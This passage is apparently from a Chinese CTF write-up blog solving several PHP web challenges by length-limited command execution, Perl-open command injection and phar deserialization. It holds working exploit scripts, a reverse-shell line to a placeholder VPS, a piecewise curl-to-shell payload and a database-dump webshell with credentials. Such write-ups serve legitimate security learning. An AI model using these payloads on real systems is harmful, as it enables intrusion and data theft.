second=cmd.pop()</span><br><span class="line">        <span class="keyword">if</span> second <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            cmd.append(second)</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res=<span class="string">&#x27;&#x27;</span>+second</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                res+=<span class="string">&#x27;\\&#x27;</span>+first</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res+=first</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + res + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;sh _&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;sh g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?reset=1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?cmd=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>然后拿到shell <img src="/images/2018/08/ichunqiu-5.jpg" alt="blacsheep" /> 然后在home下面找到信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag is in the MySQL database</span><br><span class="line">fl4444g / SugZXUtgeJ52_Bvr</span><br></pre></td></tr></table></figure><p>那么再去连接mysql就可以了 不过这里连接mysql是不能直接和mysql进行通信的,所以我们将和mysql交互的结果导出到文件 <img src="/images/2018/08/ichunqiu-4.jpg" alt="blacsheep" /> 即拿到flag</p><h4 id="infosec的方法">infosec的方法</h4><p>这个比较厉害,不过在ichunqiu的环境复现不了,因为ichunqiu的web目录是/var/www/html/但是/www/sandbox并没有进行配置,所以我们无法获取到我们导出的文件,只能对其进行操作.不过思路确实很棒,学习一下 假设我们可以访问到文件的话,那么我们可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;find&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/&gt;x&#x27;</span><br></pre></td></tr></table></figure><p>然后即可把所有的文件导出到x,下载x查看所有文件,发现特殊文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/fl4444g/README.txt</span><br></pre></td></tr></table></figure><p>然后用tar命令打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zzz&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/h*&#x27;</span><br></pre></td></tr></table></figure><p>这个执行了命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf zzz /h*</span><br></pre></td></tr></table></figure><p>下载之后同样发现flag在数据库,这里infosec师傅的方法就很厉害了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt; exploit.php</span><br><span class="line">&lt;?php exec(&#x27;mysqldump --single-transaction -ufl4444g -pSugZXUtgeJ52_Bvr --all-databases &gt; /var/www/html/sandbox/727479ef7cedf30c03459bec7d87b0f0/dump.sql 2&gt;&amp;1&#x27;); ?&gt;</span><br><span class="line">EOF</span><br><span class="line">curl &#x27;http://52.199.204.34/?reset=1&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;vcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;z&#x27;</span><br><span class="line">curl -F file=@exploit.php -X POST &#x27;http://52.199.204.34/?cmd=%2A%20%2Ft%2A&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=php%20z&#x27;</span><br></pre></td></tr></table></figure><p>因为传文件过去的时候,文件会存在/tmp目录下 先创建<code>tar,vcf,z</code> 然后执行<code>* /t*</code> 也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar vcf z /t*</span><br></pre></td></tr></table></figure><p>拿到php文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php z</span><br></pre></td></tr></table></figure><p>即可执行命令然后去下载dump.sql即可拿到flag</p><h3 id="babyfirst-revenge-v2">babyfirst-revenge-v2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个是4字符命令执行,那么我们的<code>ls -t&gt;g</code>的构造就要另找办法了,官方wp是使用逆序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure><p>这样我们用<code>*</code>之后就可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g&gt;  ht-  sl</span><br></pre></td></tr></table></figure><p>然后只用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure><p>那么x中就是<code>ls -th&gt;g</code>了 其他的差不多了 自己的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;g\&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ht-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;sh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">14</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;<span class="number">67</span>\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &quot;&gt;:\\&quot;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cn\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;p.\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;he\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cs\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;la\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;b\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">target=&#x27;</span><span class="number">117.50</span><span class="number">.3</span><span class="number">.97</span>:<span class="number">8002</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh x<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">payload.append(&#x27;</span>sh g<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="string">&#x27; + target + &#x27;</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.5)</span></span><br></pre></td></tr></table></figure><p>同样拿到shell,同样的方法拿到flag</p><h3 id="ssrfme">ssrfme</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>])); </span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); </span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>])); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>); </span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>这里有个<code>GET</code>命令,使用了一下,发现是发送请求的命令,那么显然存在一个ssrf. 进一步分析,发现可以在sandbox中写入任意文件,但是思索一番还是找不到getshell的方法 看了wp之后,发现是GET这个命令的问题 <img src="/images/2018/08/ichunqiu-6.jpg" alt="blacsheep" /> 追根溯源,发现其实是perl的open的任意命令执行的问题 举个例子 <img src="/images/2018/08/ichunqiu-7.jpg" alt="blacsheep" /> 而GET中有调用到open函数,也就导致了命令执行 不过要注意,ssrf请求文件的时候文件必须存在,不过这里很好解决,因为可以创建任意文件 最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://117.50.3.97:8004/?url=your_ip:port&amp;filename=abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=&amp;filename=bash%20abc&#x27;</span><br><span class="line">curl &#x27;http://117.50.3.97:8004/?url=file:bash%20abc&amp;filename=xxx&#x27;</span><br></pre></td></tr></table></figure><p>其中服务器上面放放反弹shell的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_vps/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后nc收到shell,根目录找到flag <img src="/images/2018/08/ichunqiu-8.jpg" alt="blacsheep" /></p><h3 id="babyh-master-php-2017">baby^h-master-php-2017</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br><span class="line">    <span class="variable">$SECRET</span>  = `/read_secret`;</span><br><span class="line">    <span class="variable">$SANDBOX</span> = <span class="string">&quot;/var/www/data/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]); </span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$SANDBOX</span>));</span><br><span class="line">        <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;avatar = <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$random</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>)  !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">upload</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">show</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>分析一下代码,发现是个反序列化的题,仔细分析一下,首先发现<code>check_session()</code>中有个反序列化,不过前面有两个判断,即对data进行密钥hash然后判断,如果不同则直接<code>die</code>,然而我们并不知道secret,所以这里的反序列化并没有用 那么攻击点是什么呢?这里是orange的一个0day</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在解析phar对象的时候会反序列化metadata</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;phar://./deser.phar&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hui</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;PWN\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;deser.phar&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title 